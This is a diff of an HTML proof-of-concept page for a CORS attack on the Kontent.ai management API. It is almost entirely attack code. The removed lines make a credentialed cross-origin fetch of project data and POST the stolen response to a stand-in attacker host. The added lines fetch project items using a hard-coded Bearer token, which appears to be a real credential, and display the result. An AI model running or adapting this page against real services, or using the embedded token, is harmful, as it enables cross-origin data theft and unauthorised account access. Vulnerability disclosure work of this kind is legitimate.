@@ -1,26 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit PoC</title>
+  <title>Kontent CORS PoC</title>
 </head>
 <body>
-  <script>
-    fetch("https://manage.kontent.ai/v2/projects", {
-      method: "GET",
-      credentials: "include"
-    })
-    .then(response => response.text())
-    .then(data => {
-      // Exfiltrate to attacker server
-      fetch("https://evil.example/exfil", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ stolenData: data })
-      });
-    })
-    .catch(err => console.error("PoC failed:", err));
-  </script>
   <h1>PoC Loaded</h1>
+  <pre id="output">Loading response...</pre>
+
+  <script>
+  fetch("https://manage.kontent.ai/v2/projects/a49dd974e31200930a5164a9d836b094/items", {
+    method: "GET",
+    credentials: "include",
+    headers: {
+      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiIyN2UyMjkyZWU2NjI0YjRkYjMzN2NkZTA2YjRmNjMxNyIsImlhdCI6MTc2MjU4NzEyMSwibmJmIjoxNzYyNTg3MTIxLCJleHAiOjE3OTQxMjMxMjEsInZlciI6IjIuMC4wIiwic2NvcGVfaWQiOiIwZDBlMGI4ZjhmZmM0MTQ1YmIwNzAxNWM3ZmUyYzA3NSIsInByb2plY3RfY29udGFpbmVyX2lkIjoiYTQ5ZGQ5NzRlMzEyMDA5MzBhNTE2NGE5ZDgzNmIwOTQiLCJhdWQiOiJkZWxpdmVyLmtvbnRlbnQuYWkifQ.VK0g-_-0Qu0FrXON3ux7uGUfHjO1qMBhJD10Z6QvkzU",
+      "Content-Type": "application/json"
+    }
+  })
+  .then(res => res.json())
+  .then(data => {
+    document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+  });
+  </script>
 </body>
 </html>
+
+
 
